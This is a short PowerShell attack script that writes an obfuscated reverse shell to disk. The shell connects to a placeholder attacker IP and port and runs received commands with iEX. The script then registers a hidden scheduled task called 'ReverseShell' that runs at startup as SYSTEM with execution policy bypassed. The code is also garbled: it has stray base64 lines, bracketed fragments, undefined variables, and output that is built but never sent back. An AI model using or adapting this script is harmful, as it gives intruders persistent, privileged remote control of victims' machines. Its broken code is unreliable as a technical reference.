$ip = "attacker_ip_placeholder"
$port = "attacker_port_placeholder"
$path = "script_path_placeholder"

@"
\$a=[TYPENAME]System.Net.Sockets.TCPClient;
\$b=\$a.'NeW'('attacker_ip_placeholder',attacker_port_placeholder);
\$c=\$b.'GetStream'();
[d]# Ym9keVtdXSRieXRlcwAgPT0gMC4uNjU1MzV8fTA=
\$d = (.\($([char]36)).'GeTsTrEaM'());
\$e = 0..65535|%{0};
[whVtIGlzCjEwIHwgJHMgLT4gMCkgeyRAKz0kKSAtbmUgMCAkYnl0ZXMuTEFTRmwnU3Vic2NyaWJlLi5H
ZXRTdHJpbmckKGB5dGVyZXMsMCwgJCBiZW5kIC0gMCk7ICRzLlJlYWQoJHskaSl9fSAtbmUgMCkge30=
\$f = \$d.'ReAd'(\$e,0,\$e.'LENGTh');
\$g = (Nw-ObJeCT -TypENAME SysTem.TExT.ASCIIEncOdiNg).'GetString'(\$e,0,\$f);
\$h = (iEX \$g 2>&1 | OuT-STrING );
\$i = \$h + 'PS ' + (pwD).PatH + '> ';
\$j = ([text.encODing]::ASCIi).'GetbYTeS'(\$i);
\$k = ([text.encODing]::ASCII).'GetBytes'(\$i);
\$l = [TYPENAME]System.Net.Sockets.TCPClient;
\$m=\$l.'Close'();
"@ | Out-File -FilePath \$path -Encoding ASCII

\$n = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + \$path + '"'
\$o = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName 'ReverseShell' -Action \$n -Trigger \$o -User 'SYSTEM' -RunLevel Highest -Force
